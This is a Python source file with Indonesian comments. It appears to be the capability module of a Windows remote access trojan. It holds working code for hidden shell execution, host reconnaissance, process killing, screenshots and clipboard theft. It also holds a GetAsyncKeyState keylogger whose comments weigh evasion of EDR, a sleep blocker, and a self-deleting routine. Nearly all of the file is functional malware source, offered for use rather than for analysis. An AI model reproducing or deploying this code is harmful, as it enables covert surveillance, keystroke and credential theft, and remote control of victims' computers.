"""core/caps.py — permukaan kemampuan. Semua tanpa admin kecuali dinyatakan."""

import ctypes
import os
import platform
import signal
import socket
import subprocess
import threading
import time

CREATE_NO_WINDOW = 0x08000000
k32 = ctypes.WinDLL("kernel32", use_last_error=True)
u32 = ctypes.WinDLL("user32", use_last_error=True)

# Wajib: tanpa argtypes, handle 64-bit kepotong jadi 32-bit dan
# SetClipboardData balik NULL tanpa error. Ini penyebab "clipboard kosong".
k32.GlobalAlloc.restype = ctypes.c_void_p
k32.GlobalAlloc.argtypes = [ctypes.c_uint, ctypes.c_size_t]
k32.GlobalLock.restype = ctypes.c_void_p
k32.GlobalLock.argtypes = [ctypes.c_void_p]
k32.GlobalUnlock.argtypes = [ctypes.c_void_p]
u32.OpenClipboard.argtypes = [ctypes.c_void_p]
u32.GetClipboardData.restype = ctypes.c_void_p
u32.GetClipboardData.argtypes = [ctypes.c_uint]
u32.SetClipboardData.restype = ctypes.c_void_p
u32.SetClipboardData.argtypes = [ctypes.c_uint, ctypes.c_void_p]


class _MEMORYSTATUSEX(ctypes.Structure):
    _fields_ = [
        ("dwLength", ctypes.c_ulong),
        ("dwMemoryLoad", ctypes.c_ulong),
        ("ullTotalPhys", ctypes.c_ulonglong),
        ("ullAvailPhys", ctypes.c_ulonglong),
        ("ullTotalPageFile", ctypes.c_ulonglong),
        ("ullAvailPageFile", ctypes.c_ulonglong),
        ("ullTotalVirtual", ctypes.c_ulonglong),
        ("ullAvailVirtual", ctypes.c_ulonglong),
        ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
    ]


def _ram():
    m = _MEMORYSTATUSEX()
    m.dwLength = ctypes.sizeof(m)
    k32.GlobalMemoryStatusEx(ctypes.byref(m))
    return m.ullAvailPhys, m.ullTotalPhys


def uptime():
    return k32.GetTickCount64() // 1000


def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def sysinfo():
    avail, total = _ram()
    up = uptime()
    rows = [
        ("host", socket.gethostname()),
        ("user", os.getenv("USERNAME", "?")),
        ("os", "%s %s build %s" % (platform.system(), platform.release(), platform.version())),
        ("arch", platform.machine()),
        ("cpu", os.getenv("PROCESSOR_IDENTIFIER", "?")),
        ("ram", "%.1f GB free / %.1f GB" % (avail / 2 ** 30, total / 2 ** 30)),
        ("uptime", "%dd %02dh %02dm" % (up // 86400, up % 86400 // 3600, up % 3600 // 60)),
        ("admin", str(is_admin())),
        ("pid", str(os.getpid())),
        ("exe", sys_exe()),
        ("cwd", os.getcwd()),
        ("lan", lan_ip()),
    ]
    return "\n".join("%-8s: %s" % (k, v) for k, v in rows)


def sys_exe():
    import sys
    return sys.executable


def lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return "?"


def public_ip():
    try:
        import requests
        return requests.get("https://api.ipify.org", timeout=10).text.strip()
    except Exception:
        return "?"


# ── shell ────────────────────────────────────────────────────────────────────

class Shell:
    def __init__(self):
        self.cwd = os.path.expanduser("~")

    def run(self, command, timeout=60):
        try:
            p = subprocess.run(command, shell=True, cwd=self.cwd,
                               capture_output=True, timeout=timeout,
                               creationflags=CREATE_NO_WINDOW)
            out = (p.stdout + p.stderr).decode("utf-8", "replace")
            if p.returncode != 0:
                out += "\n[exit %d]" % p.returncode
        except subprocess.TimeoutExpired:
            out = "[timeout %ds]" % timeout
        except Exception as exc:
            out = "[err] %s" % exc
        return out.strip() or "(no output)"

    def cd(self, path):
        target = os.path.abspath(os.path.join(self.cwd, os.path.expanduser(path.strip())))
        if os.path.isdir(target):
            self.cwd = target
            return target
        return "[err] bukan direktori: %s" % target


def listdir(path):
    if not os.path.isdir(path):
        return "[err] bukan direktori: %s" % path
    rows = []
    try:
        entries = sorted(os.scandir(path), key=lambda e: (not e.is_dir(), e.name.lower()))
    except OSError as exc:
        return "[err] %s" % exc
    for e in entries:
        try:
            if e.is_dir():
                rows.append("        <DIR>  %s" % e.name)
            else:
                rows.append("%13d  %s" % (e.stat().st_size, e.name))
        except OSError:
            rows.append("            ?  %s" % e.name)
    return "\n".join(rows) or "(kosong)"


def processes():
    try:
        p = subprocess.run(["tasklist", "/FO", "CSV", "/NH"],
                           capture_output=True, timeout=30,
                           creationflags=CREATE_NO_WINDOW)
        return p.stdout.decode("utf-8", "replace").strip() or "(kosong)"
    except Exception as exc:
        return "[err] %s" % exc


def kill(pid):
    try:
        ctypes.windll.kernel32.TerminateProcess(
            ctypes.windll.kernel32.OpenProcess(0x0001, False, int(pid)), 1)
        return "ok"
    except Exception as exc:
        return "[err] %s" % exc


# ── layar & clipboard ────────────────────────────────────────────────────────

def screenshot(dest):
    from PIL import ImageGrab
    ImageGrab.grab(all_screens=True).save(dest, "PNG")
    return dest


def clipboard_get():
    CF_UNICODETEXT = 13
    if not u32.OpenClipboard(None):
        return "[err] clipboard terkunci"
    try:
        h = u32.GetClipboardData(CF_UNICODETEXT)
        if not h:
            return "(kosong)"
        p = k32.GlobalLock(h)
        if not p:
            return "(kosong)"
        try:
            return ctypes.wstring_at(p)
        finally:
            k32.GlobalUnlock(h)
    finally:
        u32.CloseClipboard()


def clipboard_set(text):
    CF_UNICODETEXT = 13
    GMEM_MOVEABLE = 0x0002
    data = text.encode("utf-16-le") + b"\x00\x00"
    h = k32.GlobalAlloc(GMEM_MOVEABLE, len(data))
    if not h:
        return "[err] alloc"
    p = k32.GlobalLock(h)
    ctypes.memmove(p, data, len(data))
    k32.GlobalUnlock(h)
    if not u32.OpenClipboard(None):
        return "[err] clipboard terkunci"
    try:
        u32.EmptyClipboard()
        u32.SetClipboardData(CF_UNICODETEXT, ctypes.c_void_p(h))
    finally:
        u32.CloseClipboard()
    return "ok"


def messagebox(text, title="System"):
    """Blocking. Selalu dipanggil dari thread sendiri."""
    u32.MessageBoxW(None, text, title, 0x40)


# ── keylogger ────────────────────────────────────────────────────────────────

class Keylogger:
    """GetAsyncKeyState polling. Works tanpa admin untuk window non-elevated.

    Yang nangkep: hook level kernel (EDR) dan user yang login tanpa foreground
    input sama sekali. Yang nggak ketangkep: focus-following, karena kita
    baca state global bukan hook.
    """

    SPECIAL = {8: "[BS]", 9: "[TAB]", 13: "[ENTER]", 27: "[ESC]", 32: " ",
               160: "[SHIFT]", 161: "[SHIFT]", 162: "[CTRL]", 163: "[CTRL]",
               164: "[ALT]", 165: "[ALT]", 91: "[WIN]",
               37: "[LEFT]", 38: "[UP]", 39: "[RIGHT]", 40: "[DOWN]"}

    def __init__(self, path):
        self.path = path
        self.buf = []
        self.running = False
        self._lock = threading.Lock()

    def start(self):
        if self.running:
            return "sudah jalan"
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        return "on"

    def stop(self):
        self.running = False
        self.flush()
        return "off"

    def _loop(self):
        while self.running:
            for vk in range(8, 256):
                if u32.GetAsyncKeyState(vk) & 1:
                    self.buf.append(self._char(vk))
            if len(self.buf) >= 64:
                self.flush()
            time.sleep(0.03)

    def _char(self, vk):
        if vk in self.SPECIAL:
            return self.SPECIAL[vk]
        if 48 <= vk <= 57 or 65 <= vk <= 90:
            shift = u32.GetAsyncKeyState(16) & 0x8000
            return chr(vk) if shift else chr(vk).lower()
        if vk == 190:
            return "."
        if vk == 188:
            return ","
        return ""

    def flush(self):
        with self._lock:
            if not self.buf:
                return
            os.makedirs(os.path.dirname(self.path) or ".", exist_ok=True)
            with open(self.path, "a", encoding="utf-8", errors="ignore") as fh:
                fh.write("".join(self.buf))
            self.buf = []

    def dump(self):
        self.flush()
        if not os.path.exists(self.path):
            return "(kosong)"
        with open(self.path, encoding="utf-8", errors="ignore") as fh:
            data = fh.read()
        open(self.path, "w", encoding="utf-8").close()
        return data.strip() or "(kosong)"


def no_sleep():
    """Cegah Windows masuk sleep selama sesi. Butuh hak SYSTEM? Tidak — ES_CONTINUOUS."""
    ES_CONTINUOUS = 0x80000000
    ES_SYSTEM_REQUIRED = 0x00000001
    k32.SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED)


def self_destruct(exe_path):
    """Hapus exe setelah proses mati. Cmd /c ping ~3 detik lalu del."""
    subprocess.Popen(
        'cmd /c ping -n 4 127.0.0.1 >nul & del /f /q "%s"' % exe_path,
        shell=True, creationflags=CREATE_NO_WINDOW)
